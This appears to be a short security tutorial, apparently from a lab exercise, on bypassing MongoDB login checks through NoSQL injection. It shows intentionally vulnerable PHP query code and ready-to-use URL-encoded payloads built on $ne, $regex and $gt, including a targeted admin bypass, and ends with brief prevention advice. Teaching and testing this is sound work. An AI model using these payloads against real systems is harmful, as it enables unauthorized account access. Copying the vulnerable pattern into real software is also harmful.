# Bypassing Authentication

When user input is passed unsanitized into MongoDB queries, we can manipulate query operators to bypass authentication or extract data.

## Authentication Bypass Example

Vulnerable PHP code:

```php
$query = new MongoDB\Driver\Query(array(
    "email" => $_POST['email'], 
    "password" => $_POST['password']
));
$cursor = $manager->executeQuery('mangomail.users', $query);
```

This translates to:

```javascript
db.users.find({
    email: "<email>",
    password: "<password>"
});
```

## Bypass Techniques

### 1) $ne (not equal) operator

Use `$ne` to match documents where email/password are NOT equal to known invalid values:

```javascript
db.users.find({
    email: {$ne: "test@test.com"},
    password: {$ne: "test"}
});
```

URL-encoded payload:
```
email[$ne]=test@test.com&password[$ne]=test
```

### 2) $regex (pattern matching)

Match any string using regex:

```javascript
db.users.find({
    email: {$regex: /.*/},
    password: {$regex: /.*/}
});
```

URL-encoded payload:
```
email[$regex]=.*&password[$regex]=.*
```

### 3) $gt/$gte (greater than/equal)

Any non-empty string is "greater than" empty string:

```javascript
db.users.find({
    email: {$gt: ""},
    password: {$gt: ""}
});
```

URL-encoded payload:
```
email[$gt]=&password[$gt]=
```

### 4) Targeted bypass (known email)

If you know an admin email:

```javascript
db.users.find({
    email: "admin@mangomail.com",
    password: {$ne: "x"}
});
```

URL-encoded payload:
```
email=admin%40mangomail.com&password[$ne]=x
```

## Key Points

- PHP converts `param[$op]=val` to `param: {$op: val}` in MongoDB queries.
- Mix and match operators for different scenarios.
- Test with known invalid credentials first to ensure `$ne` works.
- Always URL-encode special characters (`@` → `%40`).

## Prevention

- Use parameterized queries or input validation.
- Escape/validate user input before passing to MongoDB.
- Implement proper authentication logic with hashed passwords.
